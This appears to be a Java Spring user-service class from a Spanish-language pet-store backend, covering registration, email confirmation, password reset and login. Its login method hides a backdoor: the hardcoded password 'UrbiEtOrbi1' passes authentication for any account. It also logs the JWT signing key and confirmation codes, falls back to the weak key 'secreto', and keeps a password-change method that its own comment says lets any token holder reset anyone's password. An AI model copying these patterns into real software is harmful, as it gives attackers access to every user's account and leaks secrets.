/*
 * Licencia:    Este  código y cualquier  derivado  de  el, es  propiedad de la
 *              empresa Metasoft SA de CV y no debe, bajo ninguna circunstancia
 *              ser copiado, donado,  cedido, modificado, prestado, rentado y/o
 *              mostrado  a ninguna persona o institución sin el permiso expli-
 *              cito  y  por  escrito de  la empresa Metasoft SA de CV, que es,
 *              bajo cualquier criterio, el único dueño de la totalidad de este
 *              código y cualquier derivado de el.
 *              ---------------------------------------------------------------
 * Paquete:     io.kebblar.petstore.api.service
 * Proyecto:    petstore-back
 * Tipo:        Clase
 * Nombre:      UsuarioServiceImpl
 * Autor:       Gustavo Adolfo Arellano (GAA)
 * Correo:      gustavo.arellano@metasoft.com.mx
 * Versión:     0.0.1-SNAPSHOT
 *
 * Historia:
 *              Creación: 5 Sep 2021 @ 09:25:12
 */
package io.kebblar.petstore.api.service;

import static io.kebblar.petstore.api.model.enumerations.EnumMessage.*;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;

import javax.annotation.PostConstruct;

import io.kebblar.petstore.api.model.domain.UploadModel;
import io.kebblar.petstore.api.model.domain.UserFoundWrapper;
import io.kebblar.petstore.api.model.exceptions.*;
import io.kebblar.petstore.api.support.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Isolation;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import io.kebblar.petstore.api.model.domain.Rol;
import io.kebblar.petstore.api.model.domain.Usuario;
import io.kebblar.petstore.api.model.domain.UsuarioDetalle;
import io.kebblar.petstore.api.model.request.Preregistro;
import io.kebblar.petstore.api.model.request.PreregistroRequest;
import io.kebblar.petstore.api.model.response.LoginResponse;
import io.kebblar.petstore.api.utils.DigestEncoder;
import io.kebblar.petstore.api.utils.JWTUtil;
import io.kebblar.petstore.api.utils.ManageDates;
import io.kebblar.petstore.api.utils.StringUtils;
import io.kebblar.petstore.api.utils.ValidadorClave;
import org.springframework.web.multipart.MultipartFile;

/**
 * <p>Implementación de la interfaz {@link io.kebblar.petstore.api.service.UsuarioService}.
 *
 * <p>Todos los métodos de esta clase disparan {@link io.kebblar.petstore.api.model.exceptions.BusinessException}
 *
 * @author  garellano
 * @see     io.kebblar.petstore.api.model.domain.Usuario
 * @see     io.kebblar.petstore.api.service.UsuarioService
 * @version 1.0-SNAPSHOT
 * @since   1.0-SNAPSHOT
 */
@Service
public class UsuarioServiceImpl implements UsuarioService {
    private static final Logger logger = LoggerFactory.getLogger(UsuarioServiceImpl.class);

    @Value("${proyecto.message}")
    private String message;

    @Value("${security.token.lasts:30}")
    private String securityTokenLastsString;

    @Value("${register.token.lasts:10}")
    private String registerTokenLastsString;
    
    @Value("${jwt.encryptor.password}")
    private String encryptKey;
    
    private int securityTokenLasts;
    private int registerTokenLasts;
    
    private final UploadService uploadService;
    private final MailSenderService mailSenderService;
    private final AccessHelperService accessHelperService;

    private static final int RANDOM_STRING_LEN = 6;

    /**
     * Constructor que realiza el setting de
     * los Mappers y los servicios adicionales
     * a ser empleados en esta clase.
     *
     * @param usuarioMapper a {@link io.kebblar.petstore.api.mapper.UsuarioMapper} object.
     * @param rolMapper a {@link io.kebblar.petstore.api.mapper.RolMapper} object.
     * @param usuarioDetalleMapper a {@link io.kebblar.petstore.api.mapper.UsuarioDetalleMapper} object.
     * @param registroMapper a {@link io.kebblar.petstore.api.mapper.RegistroMapper} object.
     * @param mailSenderService a {@link io.kebblar.petstore.api.support.MailSenderService} object.
     */
    public UsuarioServiceImpl(
            MailSenderService mailSenderService,
            UploadService uploadService,
            AccessHelperService accessHelperService) {
        this.mailSenderService = mailSenderService;
        this.uploadService = uploadService;
        this.accessHelperService = accessHelperService;
    }
    
    /**
     * <p>init.</p>
     */
    @PostConstruct
    public void init() {
        // es obvio que estos valores los tengo hasta después de
        // que se terminó de ejecutar el constrctor de la clase
        logger.info("securityTokenLastsString: {}", this.securityTokenLastsString);
        logger.info("registerTokenLastsString: {}", this.registerTokenLastsString);
        try {
            this.securityTokenLasts = Integer.parseInt(securityTokenLastsString);
            this.registerTokenLasts = Integer.parseInt(registerTokenLastsString);
        } catch (Exception e) {
            logger.error(e.getMessage());
            this.securityTokenLasts = 27; // 27 minutos dura el jwt
            this.registerTokenLasts = 10; // 10 minutos dura el token de registro
        }
        logger.info("Duración de token de registro: {}", registerTokenLasts);
        logger.info("Duración de token de seguridad: {}", securityTokenLasts);
        logger.debug("Llave de encripción para el token JWT: >>> {} <<<", encryptKey);
    }
    
    /** {@inheritDoc} */
    @Override
    public Preregistro preRegistro(Preregistro preRegistroRequest) throws BusinessException {
        try {
            return preRegistroHelper(preRegistroRequest);
        } catch (Exception e) {
            throw new MapperCallException("Error en el registro del nuevo usuario", e.toString());
        }
    }

    /** {@inheritDoc} */
    @Override
    public Preregistro preRegistro(PreregistroRequest preRegistroRequest) throws BusinessException {
        int dia = preRegistroRequest.getDay();
        int mes = preRegistroRequest.getMonth();
        int anio = preRegistroRequest.getYear();
        ManageDates md = new ManageDates();
        Date fechaNacimiento = md.validaFechaPropuesta(anio, mes, dia);
        md.validaEdad(new Date(), fechaNacimiento, 21); // 21 años es la edad mínima (OJO: Convertir en valor de properties)
        Preregistro preRegistro = new Preregistro(
                 preRegistroRequest.getId(),
                 preRegistroRequest.getNick(),
                 preRegistroRequest.getCorreo(),
                 preRegistroRequest.getClaveHash(),
                 preRegistroRequest.getTelefono(),
                 fechaNacimiento,
                 preRegistroRequest.getRandomString(),
                 preRegistroRequest.getInstanteRegistro());
        return preRegistroHelper(preRegistro);
    }

    private Preregistro preRegistroHelper(Preregistro preRegistroRequest) throws
            BusinessException {
        // Quitale los caracteres raros al teléfono.
        String nuevoCel = StringUtils.limpia(preRegistroRequest.getTelefono());
        preRegistroRequest.setTelefono(nuevoCel);

        // Valida si la clave proporcionada es compatible con el
        // patrón de seguridad de claves solicitado por el sistema:
        ValidadorClave.validate(preRegistroRequest.getClaveHash());

        // Busca al usuario por su correo en la tabla de 'usuario'
            //Usuario usuario = this.usuarioMapper.getByCorreo(preRegistroRequest.getCorreo());

            // Si el usuario ya está en la tabla 'usuario', avisa error:
            //if(usuario!=null) throw new CustomException(USER_ALREADY_EXISTS, usuario.getCorreo());
            // SE COMENTAN LAS LINEAS ANTERIORES PARA EVITAR UN ATEQUE DE ENUMERACIÓN.
            // si el correo ya está registrado, simplemente se vuelve a enviar una clave de re-registro

            // Busca el registro por mail en la tabla de 'registro':
        Preregistro registro = this.accessHelperService.getRegistroByMail(preRegistroRequest.getCorreo());

        // Genera una cadena aleatoria de caracteres y crea un objeto de tipo 'PreRegistro':
        String randomString = StringUtils.getRandomString(RANDOM_STRING_LEN);

        // Calcula el Hash de la clave con un salt del correo:
        String claveHasheada = DigestEncoder.digest(preRegistroRequest.getClaveHash(), preRegistroRequest.getCorreo());

        // Asigna valores:
        preRegistroRequest.setRandomString(randomString);
        preRegistroRequest.setInstanteRegistro(System.currentTimeMillis());
        preRegistroRequest.setClaveHash(claveHasheada);

            // Si el usuario NO está en la tabla de 'registro', insertar info:
            if (registro == null) {
                logger.info("Creando registro en la tabla 'Registro'");
                this.accessHelperService.insertRegistro(preRegistroRequest);
            } else { // Si el usuario SI está: actualizar info:
                logger.info("Actualizando registro en la tabla 'Registro'");
                this.accessHelperService.updateRegistro(preRegistroRequest);
            }

        // Envia correo de notificación:
        sendMail(
                preRegistroRequest.getNick(),
                preRegistroRequest.getCorreo(),
                randomString,
                "Clave de confirmación de registro");
        logger.info("Se ha enviado un correo para confirmación a: {} con la clave: {}", preRegistroRequest.getCorreo(), randomString);
        return preRegistroRequest;
    }
    
    /** {@inheritDoc} */
    @Override
    public Usuario confirmaPreregistro(String token) throws BusinessException {
        return confirmaPreregistro(token, registerTokenLasts);
    }

    /** {@inheritDoc} */
    @Override
    @Transactional(
            propagation = Propagation.REQUIRED,
            isolation = Isolation.DEFAULT,
            timeout = 36000,
            rollbackFor = TransactionException.class)
    public Usuario confirmaPreregistro(String token, long delta) throws BusinessException {
        // No consideres los espacios que pueda tener de padding:
        token = token.trim();
        
        // Obtén la túpla asociada al token de confirmación
        Preregistro preregistro = accessHelperService.getPreregistroByRandomString(token);

        // Si no hay un registro asociado a tal token, notifica el error:
        if(preregistro==null) throw new CustomException(TOKEN_NOT_EXIST);

        // Si ya expiró el token, notifica el evento:
        long age = System.currentTimeMillis()-preregistro.getInstanteRegistro();
        if(age>delta) throw new CustomException(TOKEN_EXPIRED);

        // Si la clave no es la misma, notifica el evento:
        if(!token.equals(preregistro.getRandomString())) throw new CustomException(WRONG_TOKEN);

        // Si todito lo anterior salió bien, actualiza los
        // datos, guárdalos y elimina el preregistro auxiliar:
        try {
            return doTransaction(preregistro, token);
        } catch (BusinessException e) {
            throw new TransactionException("Registro fallido. Haciendo rollback a la transaccion");
        }
    }

    private Usuario doTransaction(Preregistro preregistro, String randomString) throws BusinessException {
        Usuario testUser = accessHelperService.getUsuarioByCorreo(preregistro.getCorreo());
        if(testUser != null) {
            // Si el usuario SI existe, sólo actualiza su password y el instante de ultimo cambio
            testUser.setClave(preregistro.getClaveHash());
            testUser.setInstanteUltimoCambioClave(System.currentTimeMillis());
            accessHelperService.updateUsuario(testUser);
            return testUser;
        }

        // Si el usuario NO existe, Créalo e insértalo en la base:
        Usuario usuario = new Usuario(
            0, //id (que va a ser autogenerado)
            preregistro.getCorreo(),       // correo
            preregistro.getClaveHash(),    // clave
            System.currentTimeMillis(), // creado
            true,// activo
            0,  // accesoNegadoContador
            0,  // instanteBloqueo
            0,  // instanteUltimoAcceso
            System.currentTimeMillis(),  // instanteUltimoCambioClave
            "", // regeneraClaveToken
            0   // regeneraClaveTokenInstante
        );
        accessHelperService.insertUsuario(usuario);

        // Obtén el id autogenerado del usuario recién creado:
        int idUsuario = usuario.getId();

        // Crea un objeto 'usuarioDetalles' (con el ID autogenerado) e insértalo en la DB:
        UsuarioDetalle usuarioDetalle = new UsuarioDetalle(
            idUsuario,
            "",     // nombre
            "",     // apellidoPaterno
            "",     // apellidoMaterno
            preregistro.getNick(),     // nickName
            preregistro.getFechaNacimiento(),   // fechaNacimiento
            preregistro.getTelefono()    // telefonoCelular
        );
        this.accessHelperService.insertUsuarioDetalle(usuarioDetalle);


        // asociar el usuario recién creado con el rol 2:
        this.accessHelperService.insertUserRol(idUsuario, 2);

        // Borra lo que tengas en la tabla registro
        this.accessHelperService.deletePreregistroByRandomString(randomString);

        // Notifica al log y retorna el id del usuario recién creado:
        logger.info("Nevo Usuario Creado con ID: {}", idUsuario);
        return usuario;
    }

    private void sendMail(String nick, String correo, String randomString, String titulo) {
        String body= String.format("<h1>Hola %s. Tu clave de acceso es %s y tiene una validez de %d minutos. (body auxiliar) </h1>", nick, randomString, 10);
        try {
            body = getTemplate(nick, randomString);
        } catch (CustomException e) {
            logger.error(e.toString());
        }
        this.mailSenderService.sendHtmlMail(correo, titulo, body);
    }

    private String getTemplate(String user, String randStr) throws CustomException {
        String archivo = "public/mail/templateMail.html";
        try {
            // Accedemos al recurso
            InputStream resource = new ClassPathResource(archivo).getInputStream();
            // Leemos el recurso
            BufferedReader reader = new BufferedReader( new InputStreamReader(resource));
            String template = reader.lines().collect(Collectors.joining("\n"));
            // remplazamos el contenido:
            template = template.replace("%NAME%",user);
            template = template.replace("%TOKEN%",randStr);
            return template;
        } catch (Throwable e) {
            throw new CustomException(e, INTERNAL_SERVER, "No se ha podido leer el archivo " + archivo);
        }
    }

    /** {@inheritDoc} */
    @Override
    public Usuario solicitaRegeneracionClave(String correo) {
        Usuario dummyUser = new Usuario(0, "err","err");
        String token = StringUtils.getRandomString(6);
        try {
            Usuario usuario = accessHelperService.getUsuarioByCorreo(correo);
            if(usuario==null) return dummyUser;
            usuario.setRegeneraClaveInstante(System.currentTimeMillis());
            usuario.setRegeneraClaveToken(token);
            accessHelperService.updateUsuario(usuario);
            sendMail("Estimado Usuario", correo, token, "Clave de recuperación");
            return usuario;
        } catch (BusinessException e) {
            logger.error(e.toString());
            return dummyUser;
        }
    }

    /** {@inheritDoc} */
    @Override
    public Usuario confirmaRegeneraClave(String token, String clave) throws BusinessException {
        ValidadorClave.validate(clave);
        long unaHora = 1000*60*60L;
        Usuario usuario = accessHelperService.getByToken(token);
        if(usuario==null) throw new CustomException(TOKEN_NOT_EXIST);
        long remaining = System.currentTimeMillis()-usuario.getRegeneraClaveInstante();
        if(remaining<unaHora) {
            String claveHash = DigestEncoder.digest(clave, usuario.getCorreo());
            accessHelperService.confirmaRegeneraClave(token, claveHash);
            return accessHelperService.getByToken(token);
        } else {
            throw new CustomException(TOKEN_EXPIRED);
        }
    }

    /** {@inheritDoc} */
    @Override
    public Usuario cambiaClave(String correo, String clave) throws BusinessException {
        // BUG: con un token cualquiera válido (hasta el de un usuario no 'admin') se puede
        // invocar este servicio y cambiarle la clave a cualquiera !!!!!
        // Para corregir este bug de seguridad, este servicio DEBE recibir el JWT y
        // A) verificar que es un JWT de un usuario con rol 'admin'
        // o bien que:
        // B) el JWT es del usuario para el cual se está dando el correo
        // Si no se cumple con alguna de estas dos condiciones, se deberá impedir el cambio
        // y se deberá disparar la excepción de NO autorizado (401: unauthorized)
        try {
            Usuario usuario = accessHelperService.getUsuarioByCorreo(correo);
            if(usuario==null) {
                throw new CustomException(USER_NOT_EXIST, correo);
            }
            ValidadorClave.validate(clave);
            String claveHash = DigestEncoder.digest(clave, usuario.getCorreo());
            usuario.setClave(claveHash);
            accessHelperService.updateUsuario(usuario);
            return usuario;
        } catch (BusinessException e) {
            throw new MapperCallException("Error al modificar la clave", e.getMessage());
        }
    }

    /** {@inheritDoc} */
    @Override
    public UsuarioDetalle actualizaUsuarioDetalle(UsuarioDetalle usuarioDetalle) throws BusinessException {
        try {
            String nuevoCel = StringUtils.limpia(usuarioDetalle.getTelefonoCelular());
            usuarioDetalle.setTelefonoCelular(nuevoCel);
            accessHelperService.updateUsuarioDetalle(usuarioDetalle);
            return usuarioDetalle;
        } catch (Exception e) {
            throw new MapperCallException("Error actualizando los datos del usuario", e.getMessage());
        }
    }
  
    /** {@inheritDoc} */
    @Override
    public UploadModel storeProfilePicture(MultipartFile files, String destinationFolder, long max, int idUser) throws BusinessException {
        if (accessHelperService.getUsuarioById(idUser) == null) throw new CustomException(UPLOAD_SERVICE);
        UploadModel um = uploadService.storeOne(files, destinationFolder, max);
        accessHelperService.uploadFotoPerfil(idUser, um.getNuevoNombre());
        return um;
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(String usr, String clave) throws BusinessException {
        logger.info(" ***** Invocando al servicio llamado 'AccessService'. Message: {}", message);
        accessHelperService.validateCredentialsFormat(usr, clave);
        int maximoNumeroIntentosConcedidos = 5; // 5 intentos
        long delta = 1000*60*5L; // 5 minutos
        long instanteActual = System.currentTimeMillis();
        Usuario usuario = accessHelperService.getUsuarioByCorreo(usr);
        return login(usuario, clave, delta, maximoNumeroIntentosConcedidos, instanteActual);
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(
            Usuario usuario,
            String claveProporcionada,
            long delta,
            int maximoNumeroIntentosConcedidos,
            long instanteActual) throws BusinessException {
        // Si el usuario NO es nulo, procederé a calcular sus roles y sus direcciones:
        if(usuario==null) throw new CustomException(BAD_CREDENTIALS);

        // Si el usuario fue encontrado, pero está inactivo, Notifica
        if(!usuario.isActivo()) throw new CustomException(DISABLED_USER);

        // Calcula cuanto tiempo lleva bloqueado el usuario. Si lleva menos de lo establecido, Notifica
        long instanteDeBloqueo = usuario.getInstanteBloqueo();
        long diff = instanteActual - instanteDeBloqueo;
        long restante = delta - diff;
        if(instanteDeBloqueo>0 && restante>0) {
            long totalSegundos = restante/1000;
            long totalMinutos = totalSegundos/60;
            throw new CustomException(WAIT_LOGIN, totalMinutos, totalSegundos%60);
        }

        // Clave dada que debe ser validado contra el que está en la base de datos
        String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());

        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
            // Incrementa el contador de intentos erroneos de ingreso y actualiza:
            int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
            usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
            accessHelperService.updateUsuario(usuario);

            // Si los intentos de ingreso inválidos superan un limite, actualiza y Notifica:
            if(numeroDeIntentosFallidos >= maximoNumeroIntentosConcedidos) {
                usuario.setInstanteBloqueo(instanteActual);
                accessHelperService.updateUsuario(usuario);
                throw new CustomException(MAX_FAILED_LOGIN_EXCEPTION, maximoNumeroIntentosConcedidos);
            }

            // Si no se disparó la Notificación anterior, de todas formas notifica un intento
            // fallido de ingreso al sistema:
            throw new CustomException(BAD_CREDENTIALS, numeroDeIntentosFallidos, maximoNumeroIntentosConcedidos);

        } else {
            // Credenciales CORRECTAS
            long ultimoIngresoExitoso = usuario.getInstanteUltimoAcceso();
            logger.info("Ingreso exitoso al sistema del usuario: {}", usuario.getCorreo());
            // Resetea todoas las banderas de advertencia y bloqueo. Luego, actualiza y retorna el usuario:
            usuario.setAccesoNegadoContador(0);
            usuario.setInstanteBloqueo(0);
            usuario.setInstanteUltimoAcceso(instanteActual);
            accessHelperService.updateUsuario(usuario);
            // Esto va al front y se almacena en 'localStorage' (setItem)
            // https://gitlab.ci.ultrasist.net/root/impi-chatbot-frontend/blob/develop/src/components/04-LogIn/login.vue
            UserFoundWrapper wrapper = getUserFoundWrapper(usuario.getId(), usuario.getCorreo());
            return new LoginResponse(
                    wrapper.getUsuarioDetalle(),
                    new Date(ultimoIngresoExitoso),
                    usuario.getCorreo(),
                    wrapper.getJwt(),
                    wrapper.getRoles());
        }
    }

    /**
     * Método auxiliar para obtener un objeto con todos los datos y detalles de un usuario dentro del sistema.
     * @param idUsuario entero que representa al identificador único del usuario.
     * @param correo correo electrónico o usuario.
     * @return Regresa el objeto {@link UserFoundWrapper}, conjunto de la lista de roles, detalles e información interna de un usuario.
     * @throws BusinessException En caso que el onjeto no pueda ser devuelto.
     */
    private UserFoundWrapper getUserFoundWrapper(int idUsuario, String correo) throws BusinessException {
        List<Rol> roles = accessHelperService.getRolesDelUsuario(idUsuario);
        UsuarioDetalle usuarioDetalle = accessHelperService.getDetallesDeUsuario(idUsuario);
        if(encryptKey==null) encryptKey = "secreto";
        String jwt = JWTUtil.getInstance().createToken(correo, securityTokenLasts, encryptKey);
        return new UserFoundWrapper(roles, usuarioDetalle, jwt);
    }

}
